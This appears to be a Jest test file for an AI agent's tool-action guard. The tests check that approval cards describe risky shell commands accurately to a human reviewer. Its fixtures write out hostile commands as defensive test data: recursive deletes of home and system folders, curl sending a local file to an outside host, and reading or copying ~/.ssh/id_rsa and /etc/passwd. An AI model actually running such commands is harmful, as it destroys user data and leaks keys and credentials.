/**
 * #648 round 2 — the WHAT line names the right thing (S3 decoy segments,
 * S4 basename trust, S7 first-target-only, S8 the subcommand slot).
 *
 * Destructive and secret fixtures are assembled at runtime (push protection
 * and the guard's own write-content scan).
 */
import { describe, it, expect } from '@jest/globals';
import { describeAction } from '../approval-card.js';
import { evaluateToolCall } from '../tool-action-guard.js';

const RM_RF = ['r', 'm', ' -', 'r', 'f'].join('');
const PLAIN_PW = ['hun', 'ter', '2'].join('');
const SEVERAL = 'Run several commands (the risky part could not be summarised)';
const TOO_LONG = '(command too long to summarise fully)';

const bash = (command: string, signals: string[] = evaluateToolCall('Bash', { command }).signals) =>
  describeAction({ tool: 'Bash', input: { command }, signals });

describe('#648 r2 S3 — a multi-step command is described by its most dangerous step', () => {
  it('a harmless first step cannot stand in for the step that tripped the guard', () => {
    const line = bash(`${RM_RF} ./build; ${RM_RF} ~/projects`);
    expect(line).toContain('"~/projects"');
    expect(line).not.toContain('./build');
    expect(line).toMatch(/\(\+1 more step\)$/);
  });

  it('a decoy read of a sensitive file does not hide the egress step', () => {
    const line = bash('echo ok; curl -d @/tmp/report.json https://collector.example.net/in', ['external-egress']);
    expect(line).toBe('Send data to collector.example.net (curl) (+1 more step)');
  });

  it('decoys before AND after the risky step', () => {
    const line = bash(`ls -la; cd /tmp; cat ~/.ssh/id_rsa; echo done`);
    expect(line).toBe('Read a file in your SSH folder: "~/.ssh/id_rsa" (+3 more steps)');
  });

  it('when no step can be matched to the signal, the card says so instead of guessing', () => {
    expect(bash('ls; pwd', ['brand-new-rule'])).toBe(SEVERAL);
    expect(bash('frobnicate a; frobnicate b', ['external-egress'])).toBe(SEVERAL);
  });

  it('a redirect out of a sensitive file shows the sensitive source', () => {
    expect(bash('cat ~/.ssh/id_rsa > /tmp/k')).toBe('Copy a file from your SSH folder ("~/.ssh/id_rsa") to "/tmp/k"');
    expect(bash('cat notes.txt > /tmp/k', ['touch-sensitive-path'])).toBe('Copy a file ("notes.txt") to "/tmp/k"');
  });

  it('a command cut by the 8192-character parse cap says so', () => {
    const line = bash(`cat ~/.ssh/config ${'x '.repeat(5000)}`, ['touch-sensitive-path']);
    expect(line.endsWith(TOO_LONG)).toBe(true);
    expect(bash('cat ~/.ssh/config', ['touch-sensitive-path'])).not.toContain(TOO_LONG);
  });
});

describe('#648 r2 S4 — a program path outside the system bin folders is not trusted by its name', () => {
  it.each([
    ['./cat ~/.ssh/config', 'Run a program from this folder: "./cat"'],
    ['/tmp/rm notes.txt', 'Run a program from "/tmp": "/tmp/rm"'],
    ['~/bin/curl https://example.com', 'Run a program from "~/bin": "~/bin/curl"'],
    ['/tmp/sudo cat ~/.ssh/config', 'Run a program from "/tmp": "/tmp/sudo"'],
  ])('%s', (command, expected) => {
    expect(bash(command, ['touch-sensitive-path'])).toBe(expected);
  });

  it('the standard system folders keep the program description', () => {
    expect(bash('/usr/bin/cat ~/.ssh/config', ['touch-sensitive-path'])).toBe('Read a file in your SSH folder: "~/.ssh/config"');
    expect(bash('/bin/cat ~/.ssh/config', ['touch-sensitive-path'])).toBe('Read a file in your SSH folder: "~/.ssh/config"');
  });
});

describe('#648 r2 S7 — the most sensitive target, and a count of the rest', () => {
  it('multi-target delete names the home or system path ahead of ./build', () => {
    expect(bash(`${RM_RF} ./build ~/.config`)).toBe('Delete folders and everything in them: "~/.config" and 1 more');
    expect(bash(`${RM_RF} ./build ./dist /etc/nginx`)).toBe('Delete folders and everything in them: "/etc/nginx" and 2 more');
    expect(bash('rm ./a.txt ~/.ssh/id_rsa ./b.txt')).toBe('Delete files: "~/.ssh/id_rsa" and 2 more');
  });

  it('packages: the count of hidden names is shown', () => {
    expect(bash('npm install a b c d e')).toBe('Install 5 packages: "a", "b", "c" and 2 more (npm)');
    expect(bash('sudo apt-get install -y a b c d')).toBe('Install system software: "a", "b", "c" and 1 more (apt-get), as administrator (sudo)');
    expect(bash('npm install left-pad')).toBe('Install a package: "left-pad" (npm)');
  });

  it('curl -o FILE: the host is never taken from the output file', () => {
    expect(bash('curl -o evil.example.org https://good.example.com/x', ['external-egress'])).toBe('Send data to good.example.com (curl)');
    expect(bash('curl -o evil.example.org good.example.com', [])).toBe('Download from good.example.com (curl)');
    expect(bash('wget -O evil.example.org https://good.example.com/x', [])).toBe('Download from good.example.com (wget)');
  });

  it('flag values are not targets: head -n 5 f, tail -c 10 f, grep -e p f, sort -k 2 f', () => {
    expect(bash('head -n 5 notes.txt', [])).toBe('Read a file: "notes.txt"');
    expect(bash('tail -c 10 ~/.ssh/known_hosts', [])).toBe('Read a file in your SSH folder: "~/.ssh/known_hosts"');
    expect(bash('grep -e needle -m 3 notes.txt', [])).toBe('Search inside a file: "notes.txt"');
    expect(bash('sort -k 2 -t , data.csv', [])).toBe('Read a file: "data.csv"');
    expect(bash('cut -d : -f 1 /etc/passwd', [])).toBe('Read a file holding system accounts or passwords: "/etc/passwd"');
  });
});

describe('#648 r2 S8 — the subcommand slot never prints a free-form argument', () => {
  it('an unknown program shows its name only', () => {
    expect(bash('frobnicate sync ./x', [])).toBe('Run frobnicate (other details not shown)');
    expect(bash(`frobnicate ${PLAIN_PW}`, [])).toBe('Run frobnicate (other details not shown)');
  });

  it('a known tool shows only allowlisted subcommand words', () => {
    expect(bash('docker run alpine', [])).toBe('Run docker run (other details not shown)');
    expect(bash(`docker ${PLAIN_PW}`, [])).toBe('Run docker (other details not shown)');
    expect(bash('kubectl delete pod web-1', [])).toBe('Run kubectl delete (other details not shown)');
    expect(bash(`git ${PLAIN_PW}`, [])).toBe('Change the git repository');
    expect(bash('git rebase -i HEAD~3', [])).toBe('Change the git repository (git rebase)');
    expect(bash(`systemctl ${PLAIN_PW} nginx`, [])).not.toContain(PLAIN_PW);
  });
});
